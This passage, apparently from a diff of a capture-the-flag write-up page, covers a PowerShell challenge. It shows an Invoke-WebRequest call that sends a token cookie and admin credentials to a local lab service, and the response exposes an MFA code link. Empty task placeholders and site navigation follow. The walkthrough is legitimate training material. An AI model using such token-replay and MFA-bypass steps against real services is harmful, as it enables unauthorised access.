+<p>Alternatively, I also used this - but the challenge text didn&rsquo;t change, but the output is nevertheless the same:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C&#34;</span> -Headers @{ <span style="color:#e6db74">&#39;Cookie&#39;</span> = <span style="color:#e6db74">&#34;token=5f8dd236f862f4507835b0e418907ffc&#34;</span> } -Credential <span style="color:#e6db74">&#34;admin&#34;</span> -AllowUnencryptedAuthentication </span></span></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>StatusCode        : 200
+StatusDescription : OK
+Content           : &lt;h1&gt;Cookie &#39;mfa_code&#39;, use it at &lt;a href=&#39;1732382646.3496673&#39;&gt;/mfa_validate/4216B4FAF4391EE4D3E
+                    0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C&lt;/a&gt;&lt;/h1&gt;
+RawContent        : HTTP/1.1 200 OK
+                    Server: Werkzeug/3.0.6
+                    Server: Python/3.10.12
+                    Date: Sat, 23 Nov 2024 17:24:06 GMT
+                    Connection: close
+                    Content-Type: text/html; charset=utf-8
+                    Content-Length: 149
+                    
+                    &lt;h1&gt;Cookie &#39;mfa_code&#39;, u…
+Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Ty
+                    pe, System.String[]]…}
+Images            : {}
+InputFields       : {}
+Links             : {@{outerHTML=&lt;a href=&#39;1732382646.3496673&#39;&gt;/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5
+                    D124FE08E227F84D687A7E06C&lt;/a&gt;; tagName=A; href=1732382646.3496673}}
+RawContentLength  : 149
+RelationLink      : {}</code></pre></div>
+<h4 id="task-10">Task 10</h4>
+<blockquote>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code></code></pre></div>
+<h4 id="task-x">Task X</h4>
+<blockquote>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code></code></pre></div>
+
+  <footer class="footline">
+  </footer>
+</article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <div id="R-header" class="default-animation">
+<img src="/images/logo.png" />
+
+        </div>
+        <script>
+          window.index_js_url="/searchindex.en.js?1732383767";
+        </script>
+        <search><form action="/search/index.html" method="get">
+          <div class="searchbox default-animation">
+            <button class="search-detail" type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
+            <label class="a11y-only" for="R-search-by">Search</label>
+            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
+          </div>
+        </form></search>
+        <script>
+          var contentLangs=['en'];
+        </script>
+        <script src="/js/auto-complete.js?1732383767" defer></script>
+        <script src="/js/lunr/lunr.min.js?1732383767" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1732383767" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1732383767" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1732383767" defer></script>
+        <script src="/js/search.js?1732383767" defer></script>
+      </div>
+      <div id="R-homelinks" class="default-animation">
+        <hr class="padding">
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div id="R-shortcutmenu-home" class="R-sidebarmenu">
+          <ul class="enlarge morespace collapsible-menu">
+            <li class="" data-nav-id="/prologue/index.html"><a class="padding" href="/prologue/index.html">Prologue</a><ul id="R-subsections-79f8c3758567434c5ed9379b17ae831b" class="collapsible-menu"></ul></li>
+            <li class="" data-nav-id="/act1/index.html"><a class="padding" href="/act1/index.html">Act1</a><ul id="R-subsections-8dc0c36ceefa45529ff4cf1f9bdc1f66" class="collapsible-menu"></ul></li>
+            <li class="parent " data-nav-id="/act2/index.html"><a class="padding" href="/act2/index.html">Act2</a><ul id="R-subsections-9d3d8c898368693a495088de36411fa6" class="collapsible-menu">
+            <li class="" data-nav-id="/act2/mobile-analysis/index.html"><a class="padding" href="/act2/mobile-analysis/index.html">Mobile Analysis</a></li>
+            <li class="" data-nav-id="/act2/drone-path/index.html"><a class="padding" href="/act2/drone-path/index.html">Drone Path</a></li>
+            <li class="active " data-nav-id="/act2/powershell/index.html"><a class="padding" href="/act2/powershell/index.html">Powershell</a></li>
+            <li class="" data-nav-id="/act2/snowball-showdown/index.html"><a class="padding" href="/act2/snowball-showdown/index.html">Snowball Showdown</a></li>
+            <li class="" data-nav-id="/act2/microsoft-kc7/index.html"><a class="padding" href="/act2/microsoft-kc7/index.html">Microsoft Kc7</a></li></ul></li>
+            <li class="" data-nav-id="/act3/index.html"><a class="padding" href="/act3/index.html">Act3</a></li>
+            <li class="" data-nav-id="/about/index.html"><a class="padding" href="/about/index.html">About</a></li>
+          </ul>
+        </div>
+    
+        <div class="padding footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showFooter"></div>
+        <div id="R-menu-footer">
+          <hr class="padding default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showFooter">
+          <div id="R-prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks">
+            <ul>
+              <li id="R-select-language-container" class="footerLangSwitch">
+                <div class="padding menu-control">
+                  <i class="fa-fw fas fa-language"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-language">Language</label>
+                    <select id="R-select-language" onchange="location = this.querySelector( this.value ).dataset.url;">
+                      <option id="R-select-language-en" value="#R-select-language-en" data-url="/act2/powershell/index.html" lang="en-us" selected></option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+              <li id="R-select-variant-container" class="footerVariantSwitch">
+                <div class="padding menu-control">
+                  <i class="fa-fw fas fa-paint-brush"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-variant">Theme</label>
+                    <select id="R-select-variant" onchange="window.variants && variants.changeVariant( this.value );">
+                      <option id="R-select-variant-christmas" value="christmas" selected>Christmas</option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+                <script>window.variants && variants.markSelectedVariant();</script>
+              </li>
+              <li class="footerVisitedLinks">
+                <div class="padding menu-control">
+                  <i class="fa-fw fas fa-history"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <button onclick="clearHistory();">Clear History</button>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+            </ul>
+          </div>
+          <div id="R-footer" class="footerFooter showFooter">
+        <p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p>
+          </div>
+        </div>
+      </div>
+    </aside>
+    <script src="/js/clipboard.min.js?1732383767" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1732383767" defer></script>
+    <script src="/js/d3/d3-color.min.js?1732383767" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1732383767" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1732383767" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1732383767" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1732383767" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1732383767" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1732383767" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1732383767" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1732383767" defer></script>
+    <script src="/js/js-yaml.min.js?1732383767" defer></script>
+    <script src="/js/mermaid.min.js?1732383767" defer></script>
+    <script>
+      window.themeUseMermaid = JSON.parse("{}");
+    </script>
+    <script src="/js/theme.js?1732383767" defer></script>
+  </body>
+</html>
